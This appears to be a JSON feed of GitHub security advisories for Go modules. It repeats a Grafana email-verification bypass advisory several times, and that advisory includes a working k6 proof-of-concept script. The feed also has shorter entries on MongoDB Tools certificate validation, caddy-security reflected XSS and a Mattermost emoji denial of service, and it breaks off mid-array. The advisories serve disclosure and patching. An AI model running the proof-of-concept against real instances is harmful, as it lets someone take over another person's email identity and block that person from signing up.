{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Email validation can easily be bypassed because <code>verify_email_enabled</code> option enable email validation at sign up only.\nA user changing it's email after signing up (and verifying it) can change it without verification in <code>/profile</code>.\nThis can be used to prevent legitimate owner of the email address from signing up.</p>\n<p>Another way to prevent email's owner from signing up is by setting Username as an email:\nWhen a new user is registrering, they can set two different email addresses in the Email and Username field, technically having 2 email addresses (because Grafana handles usernames and emails the same in some situations), but only the former is validated.</p>\n<p><img alt=\"\" src=\"https://user-images.githubusercontent.com/44581623/282073913-c1a8c20b-b6c3-46eb-840c-9e0dae718a2a.png\"></p>\n<p>Here user a prevents owner of <a href=\"mailto:bar@example.com\">bar@example.com</a> to signup.</p>\n<h3 id=\"details\">Details</h3>\n<p>I don't know exact location but this is related to PUT /api/user handler.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Bypass email validation:</p>\n<ul>\n<li>Start a new grafana instance using latest version</li>\n<li>Sign up with email foo@example.</li>\n<li>Login to that account.</li>\n<li>Go to profile and change email to  <a href=\"mailto:bar@example.com\">bar@example.com</a></li>\n<li>That's it, your using an email you don't own.</li>\n</ul>\n<p>Prevent email's owner from signing up:</p>\n<ul>\n<li>Start a new grafana instance using latest version</li>\n<li>Sign up with email foo@example.</li>\n<li>Login to that account.</li>\n<li>Go to profile and change username (not email) to <a href=\"mailto:bar@example.com\">bar@example.com</a></li>\n<li>Signout.</li>\n<li>Try to sign up with email <a href=\"mailto:b@example.com\">b@example.com</a></li>\n<li>Warning popup \"User with same email address already exists\"</li>\n</ul>\n<p>K6 script (with <code>verify_email_enabled</code> set to <code>false</code>):</p>\n<pre><code class=\"language-js\">import { check, group } from \"k6\"\nimport http from \"k6/http\"\n\nexport const options = {\n  scenarios: {\n    perVuIter: {\n      executor: 'per-vu-iterations',\n      vus: 1,\n      iterations: 1\n    }\n  }\n}\n\nconst GRAFANA_URL = __ENV.GRAFANA_URL || \"http://localhost:3000\"\n\nexport default function () {\n  group(\"create user_a with email foo@example.com\", () =&gt; {\n    const response = http.post(`${GRAFANA_URL}/api/user/signup/step2`, JSON.stringify({\n      \"email\": \"foo@example.com\",\n      \"password\": \"password\"\n    }), {\n      headers: {\n        'Content-Type': \"application/json\"\n      }\n    })\n\n    check(response, {\n      'status code is 200': (r) =&gt; r.status == 200\n    })\n  })\n\n  group(\"change user_a login to bar@example.com\", () =&gt; {\n    const response = http.put(`${GRAFANA_URL}/api/user`, JSON.stringify({\n      \"email\": \"foo@example.com\",\n      \"login\": \"bar@example.com\", // user_b email.\n    }), {\n      headers: {\n        'Content-Type': \"application/json\"\n      }\n    })\n\n    check(response, {\n      'status code is 200': (r) =&gt; r.status == 200\n    })\n  })\n\n  http.cookieJar().clear(GRAFANA_URL)\n\n  group(\"create user_b with email bar@example.com\", () =&gt; {\n    const response = http.post(`${GRAFANA_URL}/api/user/signup/step2`, JSON.stringify({\n      \"email\": \"bar@example.com\",\n      \"username\": \"bar@example.com\",\n      \"password\": \"password\"\n    }), {\n      headers: {\n        'Content-Type': \"application/json\"\n      }\n    })\n\n    check(response, {\n      'status code is 200': (r) =&gt; r.status == 200 // fail\n    })\n  })\n}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Bypass email verification.\nPrevent legitimate owner from signing up.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-3hv4-r2fm-h27f\">https://github.com/grafana/bugbounty/security/advisories/GHSA-3hv4-r2fm-h27f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3hv4-r2fm-h27f\">https://github.com/advisories/GHSA-3hv4-r2fm-h27f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3hv4-r2fm-h27f",
            "title": "[github.com/grafana/grafana] Email Validation Bypass And Preventing Sign Up From Email's Owner",
            "date_modified": "2024-02-13T22:25:11.000Z",
            "date_published": "2024-02-13T22:25:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3hv4-r2fm-h27f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Email validation can easily be bypassed because <code>verify_email_enabled</code> option enable email validation at sign up only.\nA user changing it's email after signing up (and verifying it) can change it without verification in <code>/profile</code>.\nThis can be used to prevent legitimate owner of the email address from signing up.</p>\n<p>Another way to prevent email's owner from signing up is by setting Username as an email:\nWhen a new user is registrering, they can set two different email addresses in the Email and Username field, technically having 2 email addresses (because Grafana handles usernames and emails the same in some situations), but only the former is validated.</p>\n<p><img alt=\"\" src=\"https://user-images.githubusercontent.com/44581623/282073913-c1a8c20b-b6c3-46eb-840c-9e0dae718a2a.png\"></p>\n<p>Here user a prevents owner of <a href=\"mailto:bar@example.com\">bar@example.com</a> to signup.</p>\n<h3 id=\"details\">Details</h3>\n<p>I don't know exact location but this is related to PUT /api/user handler.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Bypass email validation:</p>\n<ul>\n<li>Start a new grafana instance using latest version</li>\n<li>Sign up with email foo@example.</li>\n<li>Login to that account.</li>\n<li>Go to profile and change email to  <a href=\"mailto:bar@example.com\">bar@example.com</a></li>\n<li>That's it, your using an email you don't own.</li>\n</ul>\n<p>Prevent email's owner from signing up:</p>\n<ul>\n<li>Start a new grafana instance using latest version</li>\n<li>Sign up with email foo@example.</li>\n<li>Login to that account.</li>\n<li>Go to profile and change username (not email) to <a href=\"mailto:bar@example.com\">bar@example.com</a></li>\n<li>Signout.</li>\n<li>Try to sign up with email <a href=\"mailto:b@example.com\">b@example.com</a></li>\n<li>Warning popup \"User with same email address already exists\"</li>\n</ul>\n<p>K6 script (with <code>verify_email_enabled</code> set to <code>false</code>):</p>\n<pre><code class=\"language-js\">import { check, group } from \"k6\"\nimport http from \"k6/http\"\n\nexport const options = {\n  scenarios: {\n    perVuIter: {\n      executor: 'per-vu-iterations',\n      vus: 1,\n      iterations: 1\n    }\n  }\n}\n\nconst GRAFANA_URL = __ENV.GRAFANA_URL || \"http://localhost:3000\"\n\nexport default function () {\n  group(\"create user_a with email foo@example.com\", () =&gt; {\n    const response = http.post(`${GRAFANA_URL}/api/user/signup/step2`, JSON.stringify({\n      \"email\": \"foo@example.com\",\n      \"password\": \"password\"\n    }), {\n      headers: {\n        'Content-Type': \"application/json\"\n      }\n    })\n\n    check(response, {\n      'status code is 200': (r) =&gt; r.status == 200\n    })\n  })\n\n  group(\"change user_a login to bar@example.com\", () =&gt; {\n    const response = http.put(`${GRAFANA_URL}/api/user`, JSON.stringify({\n      \"email\": \"foo@example.com\",\n      \"login\": \"bar@example.com\", // user_b email.\n    }), {\n      headers: {\n        'Content-Type': \"application/json\"\n      }\n    })\n\n    check(response, {\n      'status code is 200': (r) =&gt; r.status == 200\n    })\n  })\n\n  http.cookieJar().clear(GRAFANA_URL)\n\n  group(\"create user_b with email bar@example.com\", () =&gt; {\n    const response = http.post(`${GRAFANA_URL}/api/user/signup/step2`, JSON.stringify({\n      \"email\": \"bar@example.com\",\n      \"username\": \"bar@example.com\",\n      \"password\": \"password\"\n    }), {\n      headers: {\n        'Content-Type': \"application/json\"\n      }\n    })\n\n    check(response, {\n      'status code is 200': (r) =&gt; r.status == 200 // fail\n    })\n  })\n}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Bypass email verification.\nPrevent legitimate owner from signing up.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-3hv4-r2fm-h27f\">https://github.com/grafana/bugbounty/security/advisories/GHSA-3hv4-r2fm-h27f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3hv4-r2fm-h27f\">https://github.com/advisories/GHSA-3hv4-r2fm-h27f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3hv4-r2fm-h27f",
            "title": "[github.com/grafana/grafana] Email Validation Bypass And Preventing Sign Up From Email's Owner",
            "date_modified": "2024-02-13T22:25:11.000Z",
            "date_published": "2024-02-13T22:25:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3hv4-r2fm-h27f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Email validation can easily be bypassed because <code>verify_email_enabled</code> option enable email validation at sign up only.\nA user changing it's email after signing up (and verifying it) can change it without verification in <code>/profile</code>.\nThis can be used to prevent legitimate owner of the email address from signing up.</p>\n<p>Another way to prevent email's owner from signing up is by setting Username as an email:\nWhen a new user is registrering, they can set two different email addresses in the Email and Username field, technically having 2 email addresses (because Grafana handles usernames and emails the same in some situations), but only the former is validated.</p>\n<p><img alt=\"\" src=\"https://user-images.githubusercontent.com/44581623/282073913-c1a8c20b-b6c3-46eb-840c-9e0dae718a2a.png\"></p>\n<p>Here user a prevents owner of <a href=\"mailto:bar@example.com\">bar@example.com</a> to signup.</p>\n<h3 id=\"details\">Details</h3>\n<p>I don't know exact location but this is related to PUT /api/user handler.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Bypass email validation:</p>\n<ul>\n<li>Start a new grafana instance using latest version</li>\n<li>Sign up with email foo@example.</li>\n<li>Login to that account.</li>\n<li>Go to profile and change email to  <a href=\"mailto:bar@example.com\">bar@example.com</a></li>\n<li>That's it, your using an email you don't own.</li>\n</ul>\n<p>Prevent email's owner from signing up:</p>\n<ul>\n<li>Start a new grafana instance using latest version</li>\n<li>Sign up with email foo@example.</li>\n<li>Login to that account.</li>\n<li>Go to profile and change username (not email) to <a href=\"mailto:bar@example.com\">bar@example.com</a></li>\n<li>Signout.</li>\n<li>Try to sign up with email <a href=\"mailto:b@example.com\">b@example.com</a></li>\n<li>Warning popup \"User with same email address already exists\"</li>\n</ul>\n<p>K6 script (with <code>verify_email_enabled</code> set to <code>false</code>):</p>\n<pre><code class=\"language-js\">import { check, group } from \"k6\"\nimport http from \"k6/http\"\n\nexport const options = {\n  scenarios: {\n    perVuIter: {\n      executor: 'per-vu-iterations',\n      vus: 1,\n      iterations: 1\n    }\n  }\n}\n\nconst GRAFANA_URL = __ENV.GRAFANA_URL || \"http://localhost:3000\"\n\nexport default function () {\n  group(\"create user_a with email foo@example.com\", () =&gt; {\n    const response = http.post(`${GRAFANA_URL}/api/user/signup/step2`, JSON.stringify({\n      \"email\": \"foo@example.com\",\n      \"password\": \"password\"\n    }), {\n      headers: {\n        'Content-Type': \"application/json\"\n      }\n    })\n\n    check(response, {\n      'status code is 200': (r) =&gt; r.status == 200\n    })\n  })\n\n  group(\"change user_a login to bar@example.com\", () =&gt; {\n    const response = http.put(`${GRAFANA_URL}/api/user`, JSON.stringify({\n      \"email\": \"foo@example.com\",\n      \"login\": \"bar@example.com\", // user_b email.\n    }), {\n      headers: {\n        'Content-Type': \"application/json\"\n      }\n    })\n\n    check(response, {\n      'status code is 200': (r) =&gt; r.status == 200\n    })\n  })\n\n  http.cookieJar().clear(GRAFANA_URL)\n\n  group(\"create user_b with email bar@example.com\", () =&gt; {\n    const response = http.post(`${GRAFANA_URL}/api/user/signup/step2`, JSON.stringify({\n      \"email\": \"bar@example.com\",\n      \"username\": \"bar@example.com\",\n      \"password\": \"password\"\n    }), {\n      headers: {\n        'Content-Type': \"application/json\"\n      }\n    })\n\n    check(response, {\n      'status code is 200': (r) =&gt; r.status == 200 // fail\n    })\n  })\n}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Bypass email verification.\nPrevent legitimate owner from signing up.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-3hv4-r2fm-h27f\">https://github.com/grafana/bugbounty/security/advisories/GHSA-3hv4-r2fm-h27f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3hv4-r2fm-h27f\">https://github.com/advisories/GHSA-3hv4-r2fm-h27f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3hv4-r2fm-h27f",
            "title": "[github.com/grafana/grafana] Email Validation Bypass And Preventing Sign Up From Email's Owner",
            "date_modified": "2024-02-13T22:25:11.000Z",
            "date_published": "2024-02-13T22:25:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3hv4-r2fm-h27f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Email validation can easily be bypassed because <code>verify_email_enabled</code> option enable email validation at sign up only.\nA user changing it's email after signing up (and verifying it) can change it without verification in <code>/profile</code>.\nThis can be used to prevent legitimate owner of the email address from signing up.</p>\n<p>Another way to prevent email's owner from signing up is by setting Username as an email:\nWhen a new user is registrering, they can set two different email addresses in the Email and Username field, technically having 2 email addresses (because Grafana handles usernames and emails the same in some situations), but only the former is validated.</p>\n<p><img alt=\"\" src=\"https://user-images.githubusercontent.com/44581623/282073913-c1a8c20b-b6c3-46eb-840c-9e0dae718a2a.png\"></p>\n<p>Here user a prevents owner of <a href=\"mailto:bar@example.com\">bar@example.com</a> to signup.</p>\n<h3 id=\"details\">Details</h3>\n<p>I don't know exact location but this is related to PUT /api/user handler.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Bypass email validation:</p>\n<ul>\n<li>Start a new grafana instance using latest version</li>\n<li>Sign up with email foo@example.</li>\n<li>Login to that account.</li>\n<li>Go to profile and change email to  <a href=\"mailto:bar@example.com\">bar@example.com</a></li>\n<li>That's it, your using an email you don't own.</li>\n</ul>\n<p>Prevent email's owner from signing up:</p>\n<ul>\n<li>Start a new grafana instance using latest version</li>\n<li>Sign up with email foo@example.</li>\n<li>Login to that account.</li>\n<li>Go to profile and change username (not email) to <a href=\"mailto:bar@example.com\">bar@example.com</a></li>\n<li>Signout.</li>\n<li>Try to sign up with email <a href=\"mailto:b@example.com\">b@example.com</a></li>\n<li>Warning popup \"User with same email address already exists\"</li>\n</ul>\n<p>K6 script (with <code>verify_email_enabled</code> set to <code>false</code>):</p>\n<pre><code class=\"language-js\">import { check, group } from \"k6\"\nimport http from \"k6/http\"\n\nexport const options = {\n  scenarios: {\n    perVuIter: {\n      executor: 'per-vu-iterations',\n      vus: 1,\n      iterations: 1\n    }\n  }\n}\n\nconst GRAFANA_URL = __ENV.GRAFANA_URL || \"http://localhost:3000\"\n\nexport default function () {\n  group(\"create user_a with email foo@example.com\", () =&gt; {\n    const response = http.post(`${GRAFANA_URL}/api/user/signup/step2`, JSON.stringify({\n      \"email\": \"foo@example.com\",\n      \"password\": \"password\"\n    }), {\n      headers: {\n        'Content-Type': \"application/json\"\n      }\n    })\n\n    check(response, {\n      'status code is 200': (r) =&gt; r.status == 200\n    })\n  })\n\n  group(\"change user_a login to bar@example.com\", () =&gt; {\n    const response = http.put(`${GRAFANA_URL}/api/user`, JSON.stringify({\n      \"email\": \"foo@example.com\",\n      \"login\": \"bar@example.com\", // user_b email.\n    }), {\n      headers: {\n        'Content-Type': \"application/json\"\n      }\n    })\n\n    check(response, {\n      'status code is 200': (r) =&gt; r.status == 200\n    })\n  })\n\n  http.cookieJar().clear(GRAFANA_URL)\n\n  group(\"create user_b with email bar@example.com\", () =&gt; {\n    const response = http.post(`${GRAFANA_URL}/api/user/signup/step2`, JSON.stringify({\n      \"email\": \"bar@example.com\",\n      \"username\": \"bar@example.com\",\n      \"password\": \"password\"\n    }), {\n      headers: {\n        'Content-Type': \"application/json\"\n      }\n    })\n\n    check(response, {\n      'status code is 200': (r) =&gt; r.status == 200 // fail\n    })\n  })\n}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Bypass email verification.\nPrevent legitimate owner from signing up.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-3hv4-r2fm-h27f\">https://github.com/grafana/bugbounty/security/advisories/GHSA-3hv4-r2fm-h27f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3hv4-r2fm-h27f\">https://github.com/advisories/GHSA-3hv4-r2fm-h27f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3hv4-r2fm-h27f",
            "title": "[github.com/grafana/grafana] Email Validation Bypass And Preventing Sign Up From Email's Owner",
            "date_modified": "2024-02-13T22:25:11.000Z",
            "date_published": "2024-02-13T22:25:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3hv4-r2fm-h27f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Email validation can easily be bypassed because <code>verify_email_enabled</code> option enable email validation at sign up only.\nA user changing it's email after signing up (and verifying it) can change it without verification in <code>/profile</code>.\nThis can be used to prevent legitimate owner of the email address from signing up.</p>\n<p>Another way to prevent email's owner from signing up is by setting Username as an email:\nWhen a new user is registrering, they can set two different email addresses in the Email and Username field, technically having 2 email addresses (because Grafana handles usernames and emails the same in some situations), but only the former is validated.</p>\n<p><img alt=\"\" src=\"https://user-images.githubusercontent.com/44581623/282073913-c1a8c20b-b6c3-46eb-840c-9e0dae718a2a.png\"></p>\n<p>Here user a prevents owner of <a href=\"mailto:bar@example.com\">bar@example.com</a> to signup.</p>\n<h3 id=\"details\">Details</h3>\n<p>I don't know exact location but this is related to PUT /api/user handler.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Bypass email validation:</p>\n<ul>\n<li>Start a new grafana instance using latest version</li>\n<li>Sign up with email foo@example.</li>\n<li>Login to that account.</li>\n<li>Go to profile and change email to  <a href=\"mailto:bar@example.com\">bar@example.com</a></li>\n<li>That's it, your using an email you don't own.</li>\n</ul>\n<p>Prevent email's owner from signing up:</p>\n<ul>\n<li>Start a new grafana instance using latest version</li>\n<li>Sign up with email foo@example.</li>\n<li>Login to that account.</li>\n<li>Go to profile and change username (not email) to <a href=\"mailto:bar@example.com\">bar@example.com</a></li>\n<li>Signout.</li>\n<li>Try to sign up with email <a href=\"mailto:b@example.com\">b@example.com</a></li>\n<li>Warning popup \"User with same email address already exists\"</li>\n</ul>\n<p>K6 script (with <code>verify_email_enabled</code> set to <code>false</code>):</p>\n<pre><code class=\"language-js\">import { check, group } from \"k6\"\nimport http from \"k6/http\"\n\nexport const options = {\n  scenarios: {\n    perVuIter: {\n      executor: 'per-vu-iterations',\n      vus: 1,\n      iterations: 1\n    }\n  }\n}\n\nconst GRAFANA_URL = __ENV.GRAFANA_URL || \"http://localhost:3000\"\n\nexport default function () {\n  group(\"create user_a with email foo@example.com\", () =&gt; {\n    const response = http.post(`${GRAFANA_URL}/api/user/signup/step2`, JSON.stringify({\n      \"email\": \"foo@example.com\",\n      \"password\": \"password\"\n    }), {\n      headers: {\n        'Content-Type': \"application/json\"\n      }\n    })\n\n    check(response, {\n      'status code is 200': (r) =&gt; r.status == 200\n    })\n  })\n\n  group(\"change user_a login to bar@example.com\", () =&gt; {\n    const response = http.put(`${GRAFANA_URL}/api/user`, JSON.stringify({\n      \"email\": \"foo@example.com\",\n      \"login\": \"bar@example.com\", // user_b email.\n    }), {\n      headers: {\n        'Content-Type': \"application/json\"\n      }\n    })\n\n    check(response, {\n      'status code is 200': (r) =&gt; r.status == 200\n    })\n  })\n\n  http.cookieJar().clear(GRAFANA_URL)\n\n  group(\"create user_b with email bar@example.com\", () =&gt; {\n    const response = http.post(`${GRAFANA_URL}/api/user/signup/step2`, JSON.stringify({\n      \"email\": \"bar@example.com\",\n      \"username\": \"bar@example.com\",\n      \"password\": \"password\"\n    }), {\n      headers: {\n        'Content-Type': \"application/json\"\n      }\n    })\n\n    check(response, {\n      'status code is 200': (r) =&gt; r.status == 200 // fail\n    })\n  })\n}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Bypass email verification.\nPrevent legitimate owner from signing up.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-3hv4-r2fm-h27f\">https://github.com/grafana/bugbounty/security/advisories/GHSA-3hv4-r2fm-h27f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3hv4-r2fm-h27f\">https://github.com/advisories/GHSA-3hv4-r2fm-h27f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3hv4-r2fm-h27f",
            "title": "[github.com/grafana/grafana] Email Validation Bypass And Preventing Sign Up From Email's Owner",
            "date_modified": "2024-02-13T22:25:11.000Z",
            "date_published": "2024-02-13T22:25:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3hv4-r2fm-h27f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Usage of specific command line parameter in MongoDB Tools which was originally intended to just skip hostname checks, may result in MongoDB skipping all certificate validation. This may result in accepting invalid certificates.This issue affects: MongoDB Inc. MongoDB Database Tools 3.6 versions later than 3.6.5; 3.6 versions prior to 3.6.21; 4.0 versions prior to 4.0.21; 4.2 versions prior to 4.2.11; 100 versions prior to 100.2.0. MongoDB Inc. Mongomirror 0 versions later than 0.6.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-7924\">https://nvd.nist.gov/vuln/detail/CVE-2020-7924</a></li>\n<li><a href=\"https://jira.mongodb.org/browse/TOOLS-2587\">https://jira.mongodb.org/browse/TOOLS-2587</a></li>\n<li><a href=\"https://github.com/mongodb/mongo-tools/commit/8c1800b5155084f954a39a1f2f259efac3bb86de\">https://github.com/mongodb/mongo-tools/commit/8c1800b5155084f954a39a1f2f259efac3bb86de</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6cwm-wm82-hgrw\">https://github.com/advisories/GHSA-6cwm-wm82-hgrw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6cwm-wm82-hgrw",
            "title": "[github.com/mongodb/mongo-tools] MongoDB Tools Improper Certificate Validation vulnerability",
            "date_modified": "2024-02-13T20:32:52.000Z",
            "date_published": "2022-05-24T17:47:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6cwm-wm82-hgrw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The caddy-security plugin 1.1.20 for Caddy allows reflected XSS via a GET request to a URL that contains an XSS payload and begins with either a /admin or /settings/mfa/delete/ substring.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-52430\">https://nvd.nist.gov/vuln/detail/CVE-2023-52430</a></li>\n<li><a href=\"https://github.com/greenpau/caddy-security/issues/264\">https://github.com/greenpau/caddy-security/issues/264</a></li>\n<li><a href=\"https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy\">https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xwmv-cx7p-fqfc\">https://github.com/advisories/GHSA-xwmv-cx7p-fqfc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xwmv-cx7p-fqfc",
            "title": "[github.com/greenpau/caddy-security] caddy-security plugin for Caddy vulnerable to reflected Cross-site Scripting",
            "date_modified": "2024-02-13T17:42:04.000Z",
            "date_published": "2024-02-13T00:30:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xwmv-cx7p-fqfc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost fails to check if a custom emoji reaction exists when sending it to a post and to limit the amount of custom emojis allowed to be added in a post, allowing an attacker sending a huge amount of non-existent custom emojis in a post to crash the mobile app of a user seeing the post.&nbsp;</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1402\">https://nvd.nist.gov/vuln/detail/CVE-2024-1402</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost/commit/64cb0ca8af2dbda1afcddd1604460591a4799b81\">https://github.com/mattermost/mattermost/commit/64cb0ca8af2dbda1afcddd1604460591a4799b81</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost/commit/6d2440de9fd774b67e65e3aac4ab8b6ef9aba2d8\">https://github.com/mattermost/mattermost/commit/6d2440de9fd774b67e65e3aac4ab8b6ef9aba2d8</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost/commit/81190e2da128a6985914ea7023a69ac400513fc4\">https://github.com/mattermost/mattermost/commit/81190e2da128a6985914ea7023a69ac400513fc4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-32h7-7j94-8fc2\">https://github.com/advisories/GHSA-32h7-7j94-8fc2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-32h7-7j94-8fc2",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost vulnerable to denial of service via large number of emoji reactions",
            "date_modified": "2024-02-09T21:35:04.000Z",
            "date_published": "2024-02-09T18:31:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-32h7-7j94-8fc2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost fails to check if a custom emoji reaction exists when sending it to a post and to limit the amount of custom emojis allowed to be added in a post, allowing an attacker sending a huge amount of non-existent custom emojis in a post to crash the mobile app of a user seeing the post.&nbsp;</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1402\">https://nvd.nist.gov/vuln/detail/CVE-2024-1402</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost/commit/64cb0ca8af2dbda1afcddd1604460591a4799b81\">https://github.com/mattermost/mattermost/commit/64cb0ca8af2dbda1afcddd1604460591a4799b81</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost/commit/6d2440de9fd774b67e65e3aac4ab8b6ef9aba2d8\">https://github.com/mattermost/mattermost/commit/6d2440de9fd774b67e65e3aac4ab8b6ef9aba2d8</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost/commit/81190e2da128a6985914ea7023a69ac400513fc4\">https://github.com/mattermost/mattermost/commit/81190e2da128a6985914ea7023a69ac400513fc4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-32h7-7j94-8fc2\">https://github.com/advisories/GHSA-32h7-7j94-8fc2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-32h7-7j94-8fc2",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost vulnerable to denial of service via large number of emoji reactions",
            "date_modified": "2024-02-09T21:35:04.000Z",
            "date_published": "2024-02-09T18:31:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-32h7-7j94-8fc2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost fails to check if a custom emoji reaction exists when sending it to a post and to limit the amount of custom emojis allowed to be added in a post, allowing an attacker sending a huge amount of non-existent custom emojis in a post to crash the mobile app of a user seeing the post.&nbsp;</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1402\">https://nvd.nist.gov/vuln/detail/CVE-2024-1402</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost/commit/64cb0ca8af2dbda1afcddd1604460591a4799b81\">https://github.com/mattermost/mattermost/commit/64cb0ca8af2dbda1afcddd1604460591a4799b81</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost/commit/6d2440de9fd774b67e65e3aac4ab8b6ef9aba2d8\">https://github.com/mattermost/mattermost/commit/6d2440de9fd774b67e65e3aac4ab8b6ef9aba2d8</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost/commit/81190e2da128a6985914ea7023a69ac400513fc4\">https://github.com/mattermost/mattermost/commit/81190e2da128a6985914ea7023a69ac400513fc4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-32h7-7j94-8fc2\">https://github.com/advisories/GHSA-32h7-7j94-8fc2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-32h7-7j94-8fc2",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost vulnerable to denial of service via large number of emoji reactions",
            "date_modified": "2024-02-09T21:35:04.000Z",
            "date_published": "2024-02-09T18:31:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-32h7-7j94-8fc2"
            },
            "tags": [
                "severity"
            ]
        },
        {
